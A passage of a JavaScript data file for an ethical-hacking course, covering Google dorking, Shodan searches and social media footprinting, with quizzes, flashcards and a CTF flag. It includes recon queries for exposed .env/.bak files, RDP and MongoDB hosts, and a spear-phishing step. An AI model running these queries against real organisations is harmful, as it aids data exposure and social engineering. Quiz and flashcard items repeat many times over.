      "b": "<b>Definition:</b> Replicating DNS databases across servers.<br><b>Enterprise Example:</b> Attackers dumping internal IP schemas.<br><b>Interview Tip:</b> It should be restricted to trusted secondary servers only."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};

CONTENT['google-hacking'] = {
  "id": "google-hacking",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "Google Hacking (Dorking)",
  "sub": "Using advanced search operators to find hidden data.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> Google Hacking (Dorking) uses advanced search engine operators to locate specific strings of text within search results, often uncovering sensitive files or vulnerable applications that were unintentionally indexed.<br><br><b>Simple Explanation:</b> It's like using highly specific filters in a library catalog to find the exact page of a book where a secret code is written, instead of just searching for the book title.",
    "analogy": "Imagine searching a massive warehouse. A normal search is asking 'Where are the boxes?' Dorking is asking 'Show me only red boxes, containing financial documents, modified in the last 24 hours.'",
    "why": "<b>Why This Exists:</b> To discover exposed files, directories, and vulnerabilities that search engine crawlers have already found and indexed.<br><br><b>Business Impact:</b> Accidental exposure of sensitive files (like SQL backups or configuration files with passwords) leads to immediate, zero-effort breaches.<br><br><b>Career Confidence:</b> Dorking is a crucial, zero-cost reconnaissance skill that often yields high-value targets instantly.<br><i>Roles:</i> Data Security Analyst, Penetration Tester, Bug Bounty Hunter<br><i>Interview:</i> What does the 'filetype' and 'site' operator do in a Google Dork?",
    "architecture": "1. Identify target domain.<br>2. Formulate Dork queries (e.g., site:target.com filetype:pdf).<br>3. Analyze search engine results.<br>4. Extract exposed data."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83d\udd0e",
        "label": "Select Target Domain",
        "desc": "Use the site: operator to restrict searches."
      },
      {
        "icon": "\ud83d\udee0\ufe0f",
        "label": "Apply Dorks",
        "desc": "Use filetype:, intitle:, or inurl: to find specific vulnerabilities."
      },
      {
        "icon": "\ud83d\udc40",
        "label": "Review SERPs",
        "desc": "Analyze the search engine results pages for exposed data."
      },
      {
        "icon": "\ud83d\udce5",
        "label": "Extract Intel",
        "desc": "Download exposed backups, passwords, or PII."
      }
    ]
  },
  "enterprise": {
    "role": "Data Security Analyst | Data Privacy Team",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CISO &rarr; Data Privacy Officer &rarr; You<br><br><b>Business Context:</b><br>The Data Privacy Officer is concerned that legacy PDF reports containing PII might have been indexed by search engines.",
    "challenge": "<b>Mission Brief:</b><br>Perform Google Dorking against GFS domains to identify any indexed sensitive documents.<br><br><b>Objectives:</b><br>- Locate exposed PDFs or DOCs.<br>- Identify exposed directory listings.<br><br><b>Expected Deliverables:</b><br>A list of URLs pointing to exposed sensitive files that need to be de-indexed.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [
      {
        "command": "site:target.com filetype:pdf",
        "purpose": "Find PDFs",
        "expected": "Search results limited to PDFs on target.com",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Data Privacy teams use this to find leaked documents."
      },
      {
        "command": "intitle:\"index of\" site:target.com",
        "purpose": "Find Directory Listings",
        "expected": "Exposed web directories",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Pen Testers use this to find exposed file repositories."
      }
    ],
    "lin": [
      {
        "command": "site:target.com filetype:pdf",
        "purpose": "Find PDFs",
        "expected": "Search results limited to PDFs on target.com",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Data Privacy teams use this to find leaked documents."
      },
      {
        "command": "intitle:\"index of\" site:target.com",
        "purpose": "Find Directory Listings",
        "expected": "Exposed web directories",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Pen Testers use this to find exposed file repositories."
      }
    ]
  },
  "lab": {
    "title": "Data Leak Discovery",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>Search for exposed configuration files on the GFS domain.<br><br><b>Objectives:</b><br>Use Dorks to find .env or .bak files.<br><br><b>Evidence Required:</b><br>Screenshot of search results showing exposed files.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>List of exposed URLs.<br><br><b>Manager Feedback:</b><br>Critical find. We will initiate a takedown request and secure those directories immediately.",
    "steps": [
      "<strong>Objectives:</strong> Find exposed config files.",
      "<strong>Enterprise Workspace:</strong> Open the Web Browser.",
      "Navigate to Google.com.",
      "Search for `site:globalfinsec.com ext:env OR ext:bak`."
    ]
  },
  "quiz": [
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    },
    {
      "q": "Which operator restricts results to a specific domain?",
      "opts": [
        "domain:",
        "site:",
        "inurl:",
        "host:"
      ],
      "correct": 1,
      "fb": "The site: operator is used for this.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    },
    {
      "f": "Google Dorking",
      "b": "<b>Definition:</b> Using advanced operators to find hidden data.<br><b>Enterprise Example:</b> Finding exposed .sql backups.<br><b>Interview Tip:</b> Explain how crawlers index unprotected directories."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};

CONTENT['shodan-recon'] = {
  "id": "shodan-recon",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "Shodan & Network Recon",
  "sub": "Search engines for IoT and internet-connected devices.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> Asset discovery involves using specialized search engines like Shodan to find specific devices, open ports, and vulnerable services connected to the public internet.<br><br><b>Simple Explanation:</b> While Google searches for websites and text, Shodan searches for servers, webcams, routers, and industrial control systems based on their IP addresses and open ports.",
    "analogy": "Google searches the contents of the billboards; Shodan searches for the make and model of the billboard structure itself.",
    "why": "<b>Why This Exists:</b> To identify misconfigured or unpatched infrastructure that is directly accessible from the internet.<br><br><b>Business Impact:</b> An exposed RDP port or unauthenticated database found on Shodan is often the primary vector for ransomware gangs.<br><br><b>Career Confidence:</b> Vulnerability Analysts rely heavily on Shodan to rapidly identify if their organization is affected by newly announced vulnerabilities.<br><i>Roles:</i> Vulnerability Analyst, Threat Hunter, Penetration Tester<br><i>Interview:</i> How does Shodan differ from Google?",
    "architecture": "1. Shodan actively scans the internet.<br>2. It grabs service banners.<br>3. It indexes the banners.<br>4. Analysts query the index for specific ports, protocols, or vulnerabilities."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83d\udce1",
        "label": "Query Shodan",
        "desc": "Search by organization name, IP, or specific product."
      },
      {
        "icon": "\ud83d\udea9",
        "label": "Analyze Banners",
        "desc": "Review the returned service banners for version numbers."
      },
      {
        "icon": "\ud83d\udd13",
        "label": "Identify Vulns",
        "desc": "Cross-reference exposed versions with known CVEs."
      },
      {
        "icon": "\ud83d\udee1\ufe0f",
        "label": "Remediate",
        "desc": "Ensure firewalls block public access to these sensitive ports."
      }
    ]
  },
  "enterprise": {
    "role": "Vulnerability Analyst | Vulnerability Management Team",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CISO &rarr; Vulnerability Management Lead &rarr; You<br><br><b>Business Context:</b><br>Threat Intelligence reports an active exploitation campaign targeting exposed RDP servers. You must ensure GFS has no exposed RDP endpoints on the public internet.",
    "challenge": "<b>Mission Brief:</b><br>Query Shodan for GFS IP ranges to identify any exposed remote access services.<br><br><b>Objectives:</b><br>- Identify exposed RDP (3389).<br>- Identify exposed SSH (22).<br><br><b>Expected Deliverables:</b><br>A list of exposed endpoints that require immediate firewall blocking.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [
      {
        "command": "shodan search org:\"Target\" port:3389",
        "purpose": "Find Exposed RDP",
        "expected": "List of IPs running RDP",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Vulnerability Analysts use this to find exposed remote access."
      },
      {
        "command": "shodan host [IP]",
        "purpose": "Analyze Specific IP",
        "expected": "Detailed banner information for the IP",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Incident Responders use this to see what an IP was exposing."
      }
    ],
    "lin": [
      {
        "command": "shodan search org:\"Target\" port:3389",
        "purpose": "Find Exposed RDP",
        "expected": "List of IPs running RDP",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Vulnerability Analysts use this to find exposed remote access."
      },
      {
        "command": "shodan host [IP]",
        "purpose": "Analyze Specific IP",
        "expected": "Detailed banner information for the IP",
        "mitre": "T1590",
        "analystNote": "Enterprise Use: Incident Responders use this to see what an IP was exposing."
      }
    ]
  },
  "lab": {
    "title": "Exposed Infrastructure Sweep",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>Ensure GFS has no exposed databases.<br><br><b>Objectives:</b><br>Use Shodan to search for exposed MongoDB instances within our IP range.<br><br><b>Evidence Required:</b><br>Screenshot of the Shodan search results.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>List of exposed database IPs.<br><br><b>Manager Feedback:</b><br>Great work. We will isolate these databases immediately.",
    "steps": [
      "<strong>Objectives:</strong> Find exposed databases.",
      "<strong>Enterprise Workspace:</strong> Open the Web Browser.",
      "Navigate to shodan.io.",
      "Search for `org:\"GlobalFinSec\" product:\"MongoDB\"`."
    ]
  },
  "quiz": [
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    },
    {
      "q": "What does Shodan primarily index?",
      "opts": [
        "Webpage text",
        "Service Banners",
        "DNS Records",
        "Email addresses"
      ],
      "correct": 1,
      "fb": "Shodan indexes service banners from open ports.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    },
    {
      "f": "Shodan",
      "b": "<b>Definition:</b> A search engine for internet-connected devices.<br><b>Enterprise Example:</b> Finding exposed webcams or databases.<br><b>Interview Tip:</b> Emphasize that it searches banners, not web content."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
    "prerequisites": [
      "Module 01 - Intro to Ethical Hacking"
    ],
    "lastReviewed": "2026-07-21"
  },
  "objectives": [
    "Master the fundamental concepts.",
    "Apply tools in an enterprise context.",
    "Validate knowledge through practical assessment."
  ],
  "pitfalls": [
    {
      "icon": "\u26a0\ufe0f",
      "title": "Relying solely on automated tools",
      "desc": "Automated tools often miss nuanced misconfigurations that a manual review would catch.",
      "fix": "Always manually verify the output of automated scanners against raw data."
    },
    {
      "icon": "\u26a0\ufe0f",
      "title": "Violating Rules of Engagement (ROE)",
      "desc": "Active footprinting outside the defined scope can lead to legal consequences.",
      "fix": "Double-check IP ranges and target domains against the signed ROE document before executing any active probe."
    }
  ],
  "summary": [
    "Reconnaissance is the foundation of all successful engagements.",
    "Passive OSINT provides stealthy insights without triggering alerts.",
    "Always cross-reference multiple data sources to eliminate false positives.",
    "Map findings to the MITRE ATT&CK framework for enterprise reporting."
  ],
  "ctf": {
    "scenario": "An exposed backup file was found on the target web server during recon. Analyze the file to extract the hidden flag.",
    "hint": "Look for Base64 encoded strings in the configuration block.",
    "flag": "CEH{r3c0n_m4st3r}",
    "points": 200
  }
};

CONTENT['social-media-recon'] = {
  "id": "social-media-recon",
  "module": "Module 02 - Footprinting & Reconnaissance",
  "title": "Social Media Footprinting",
  "sub": "Extracting intelligence from employee social profiles.",
  "killchain": {
    "phase": "Reconnaissance",
    "mitre": "TA0043"
  },
  "learn": {
    "simple": "<b>Definition:</b> Social Media Intelligence (SOCMINT) is the collection and analysis of information from social media platforms to profile targets, map organizational structures, and identify security awareness gaps.<br><br><b>Simple Explanation:</b> It's like looking at someone's Facebook or LinkedIn to figure out where they work, who their boss is, and what technologies they use, which can then be used to trick them.",
    "analogy": "If a company is a locked building, social media is the employees standing outside chatting loudly about the building's security codes.",
    "why": "<b>Why This Exists:</b> To understand the human element of the target organization and identify vectors for social engineering.<br><br><b>Business Impact:</b> Employees inadvertently posting photos of ID badges, whiteboard passwords, or complaining about specific software versions provides attackers with exact vectors for compromise.<br><br><b>Career Confidence:</b> Social engineering is highly successful. SOCMINT provides the pretext needed for those attacks.<br><i>Roles:</i> Insider Threat Analyst, Social Engineering Expert, Penetration Tester<br><i>Interview:</i> How can LinkedIn be used maliciously by an attacker?",
    "architecture": "1. Identify key employees.<br>2. Enumerate social profiles (LinkedIn, Twitter, Reddit).<br>3. Extract organizational structure and technology stacks.<br>4. Develop social engineering pretexts."
  },
  "diagram": {
    "title": "Architecture & Flow",
    "steps": [
      {
        "icon": "\ud83d\udc65",
        "label": "Identify Key Personnel",
        "desc": "Locate executives, IT admins, and new hires."
      },
      {
        "icon": "\ud83d\udcf1",
        "label": "Enumerate Profiles",
        "desc": "Search LinkedIn, Twitter, and other platforms."
      },
      {
        "icon": "\ud83c\udfe2",
        "label": "Extract Tech Stack",
        "desc": "Note any software or hardware mentioned in job descriptions."
      },
      {
        "icon": "\ud83c\udfa3",
        "label": "Craft Phish",
        "desc": "Create highly targeted spear-phishing emails based on interests."
      }
    ]
  },
  "enterprise": {
    "role": "Insider Threat Analyst | Security Operations",
    "situation": "<b>Organization Context:</b><br>CEO &rarr; CISO &rarr; Insider Threat Team Lead &rarr; You<br><br><b>Business Context:</b><br>A new IT Administrator was recently hired. You have been tasked with conducting an Open Source background sweep to ensure they are not exposing sensitive GFS architecture details online.",
    "challenge": "<b>Mission Brief:</b><br>Review the social media footprint of the new IT Admin for OPSEC violations.<br><br><b>Objectives:</b><br>- Review LinkedIn for excessive technology disclosure.<br>- Review Twitter for complaints about internal security policies.<br><br><b>Expected Deliverables:</b><br>An OPSEC risk report detailing what the employee is exposing.",
    "outcome": "The security controls were verified successfully, preventing potential data leaks.",
    "lesson": "Always validate external exposure before adversaries do."
  },
  "commands": {
    "win": [],
    "lin": []
  },
  "lab": {
    "title": "OPSEC Violation Sweep",
    "difficulty": "Beginner",
    "duration": "20",
    "platform": "Kali / Win",
    "scenario": "<b>Mission Brief:</b><br>Check if our new hires are exposing our tech stack.<br><br><b>Objectives:</b><br>Find the LinkedIn profile of the new IT Admin and identify the firewall vendor they listed.<br><br><b>Evidence Required:</b><br>Screenshot of the exposed firewall vendor on the profile.<br><br><i>Execute the terminal steps below.</i><br><br><b>Deliverables:</b><br>The name of the firewall vendor being used internally.<br><br><b>Manager Feedback:</b><br>Good catch. We will have a conversation with them about OPSEC.",
    "steps": [
      "<strong>Objectives:</strong> Find exposed tech stack details.",
      "<strong>Enterprise Workspace:</strong> Open the Web Browser.",
      "Navigate to LinkedIn.",
      "Search for the IT Admin's profile and review their 'Experience' section."
    ]
  },
  "quiz": [
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    },
    {
      "q": "What is a common OPSEC violation on LinkedIn?",
      "opts": [
        "Listing job title",
        "Endorsing a colleague",
        "Listing exact software versions managed",
        "Having a profile picture"
      ],
      "correct": 2,
      "fb": "Listing exact software versions provides attackers with target info.",
      "difficulty": "Foundation"
    }
  ],
  "flashcards": [
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    },
    {
      "f": "SOCMINT",
      "b": "<b>Definition:</b> Social Media Intelligence.<br><b>Enterprise Example:</b> Finding employee badge photos on Instagram.<br><b>Interview Tip:</b> It is primarily used to build pretexts for social engineering."
    }
  ],
  "meta": {
    "version": "2.0",
    "estimatedTime": "45 min",
    "difficulty": "Intermediate",
